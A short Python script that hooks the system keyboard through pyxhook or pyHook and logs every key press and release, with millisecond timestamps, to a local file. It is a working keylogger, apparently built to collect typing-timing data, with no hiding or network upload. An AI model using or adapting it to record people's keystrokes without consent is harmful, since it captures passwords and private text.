import time
import os
if os.name == 'posix':
    import pyxhook as hooklib
elif os.name == 'nt':
    import pyHook as hooklib


def millis():
    return str(int(round(time.time() * 1000)))


def log(eventtype, event):
    return eventtype + ' ' + millis() + ' ' + str(event.Ascii) + ' ' + str(event.Key)


def keyevent(eventtype):
    def handler(event):
        eventbuffer.append(log(eventtype, event))
    return handler


def persist(list):
    f = open('logv1', 'a')
    f.write("\n")
    f.write("\n".join(list))
    f.close()

eventbuffer = []
hookman = hooklib.HookManager()
hookman.KeyDown = keyevent("down")
hookman.KeyUp = keyevent("up")
hookman.HookKeyboard()
hookman.start()
while True:
    time.sleep(1)
    if len(eventbuffer) > 10:
        persist(eventbuffer[:])
        eventbuffer = []
hookman.cancel()
